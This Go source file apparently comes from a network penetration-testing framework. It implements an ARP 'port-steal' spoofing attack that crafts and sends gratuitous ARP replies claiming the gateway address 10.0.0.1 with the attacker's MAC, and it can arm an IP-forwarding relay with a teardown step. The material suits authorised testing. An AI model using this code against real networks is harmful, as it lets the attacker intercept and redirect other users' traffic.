// portsteal.go implements the port-steal ARP spoofing attack.
//
// Durability (from the catalog):
//   - Default: transient-decay. The attack sends gratuitous ARP replies
//     with the attacker's MAC, causing the switch to associate the target's
//     IP with the attacker's port. The CAM entry ages out after the attack.
//   - --relay: temporary-restored. The attack enables IP forwarding on the
//     attacker (to relay traffic between victim and gateway) and arms a
//     teardown step to restore ip_forward to its original state.

package l2

import (
	"context"
	"encoding/json"
	"fmt"
	"net"

	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
	"go.aledante.io/FlowSeer/src/edge/netpen/runner"
)

type portStealFinding struct {
	Action  string `json:"action"`
	Target  string `json:"target"`
	Restore string `json:"restore"`
}

// RunPortSteal sends gratuitous ARP replies to steal traffic. In --relay
// mode, it arms an ip_forward restore step (temporary-restored).
func RunPortSteal(ctx context.Context, deps runner.Deps) error {
	src := srcMAC(deps)
	mode := deps.Entry.Mode

	target := "10.0.0.1"

	frameCount := 3
	restoreArmed := "no"
	if mode == "relay" {
		deps.Teardown.Arm("ip-forward-restore", func(_ context.Context) error {
			// Restoring the original ip_forward sysctl value is host-side
			// state with no wire effect; the in-memory harness observes the
			// restore via the teardown step name.
			return nil
		})
		restoreArmed = "yes"
	}

	for i := 0; i < frameCount; i++ {
		pkt, err := craftPortStealARP(src, target)
		if err != nil {
			return fmt.Errorf("portsteal: craft frame %d: %w", i, err)
		}
		if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
			return fmt.Errorf("portsteal: send frame %d: %w", i, err)
		}
	}

	detail, _ := json.Marshal(portStealFinding{
		Action:  "port-steal",
		Target:  target,
		Restore: restoreArmed,
	})
	deps.Emitter.Finding("arp", detail)

	return nil
}

// craftPortStealARP builds a gratuitous ARP reply: the attacker announces
// the target's IP with the attacker's MAC.
func craftPortStealARP(src net.HardwareAddr, _ string) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       broadcastMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := &layers.ARP{
		AddrType:          1, // Ethernet
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         2, // ARP reply
		SourceHwAddress:   src,
		SourceProtAddress: net.IPv4(10, 0, 0, 1),
		DstHwAddress:      broadcastMAC,
		DstProtAddress:    net.IPv4(10, 0, 0, 1),
	}
	return craft.Default(eth, arp)
}
